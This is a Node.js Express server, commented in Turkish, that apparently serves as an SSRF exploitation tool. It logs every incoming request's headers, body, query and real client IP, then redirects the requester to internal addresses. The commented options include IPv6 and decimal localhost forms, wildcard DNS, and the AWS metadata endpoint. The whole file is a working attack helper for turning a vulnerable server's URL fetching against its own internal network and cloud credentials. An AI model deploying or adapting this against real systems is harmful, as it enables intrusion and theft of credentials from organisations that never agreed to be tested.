const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// --- 🎯 SSRF / YÖNLENDİRME HEDEFİNİ BURADAN SEÇEBİLİRSİN ---
// Alternatifleri test etmek için yorum satırını değiştirebilirsin:
// const TARGET_URL = "http://127.0.0.1:8080";            // Standart Localhost
const TARGET_URL = "http://[::1]:8080";                // IPv6 Localhost
// const TARGET_URL = "http://2130706433/";               // Decimal IP formatı
// const TARGET_URL = "http://127.0.0.1.xip.io/";         // DNS rebinding / wildcard DNS
//const TARGET_URL = "http://169.254.169.254/latest/meta-data/"; // AWS Cloud Metadata
// ---------------------------------------------------------

// Geniş gövdeleri (body) okuyabilmek için limitleri artırıyoruz
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Tüm gelen istekleri yakalayan ve yönlendiren middleware
app.use((req, res) => {
    const timestamp = new Date().toISOString();
    
    // Gerçek IP adresini yakalama (Cloudflare, Render, Proxy arkası dahil)
    const clientIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for'] || 
                     req.socket.remoteAddress;

    console.log('\n' + '='.repeat(60));
    console.log(`[${timestamp}] 🎯 YENİ İSTEK YAKALANDI VE YÖNLENDİRİLİYOR!`);
    console.log('='.repeat(60));
    console.log(`🔹 Yol (Path)      : ${req.path}`);
    console.log(`🔹 Orijinal URL    : ${req.originalUrl}`);
    console.log(`🔹 Yöntem (Method) : ${req.method}`);
    console.log(`🔹 Protokol        : ${req.protocol}`);
    console.log(`🔹 Gerçek IP       : ${clientIp}`);
    
    // Query Parametreleri
    if (req.query && Object.keys(req.query).length > 0) {
        console.log('\n--- 🔍 QUERY PARAMETRELERI ---');
        console.dir(req.query, { depth: null, colors: true });
    }
    
    // İstek Başlıkları (Headers)
    console.log('\n--- 📋 HEADERS (BAŞLIKLAR) ---');
    console.dir(req.headers, { depth: null, colors: true });

    // İstek Gövdesi (Body)
    if (req.body) {
        const bodyKeys = Object.keys(req.body);
        if (bodyKeys.length > 0 || (typeof req.body === 'string' && req.body.length > 0)) {
            console.log('\n--- 📦 BODY (GÖVDE) ---');
            console.dir(req.body, { depth: null, colors: true });
        }
    }

    console.log('='.repeat(60) + '\n');

    console.log(`⚡ [REDIRECT] İstek atan istemci şu adrese fırlatılıyor ➔ ${TARGET_URL}`);

    // HTTP 302 yönlendirmesi ile hedef iç ağ adresine veya metadata'ya zıplatıyoruz
    return res.redirect(302, TARGET_URL);
});

app.listen(PORT, () => {
    console.log(`Yönlendirmeli Gelişmiş Log Sunucusu ${PORT} portunda dinlemede... 🚀`);
});
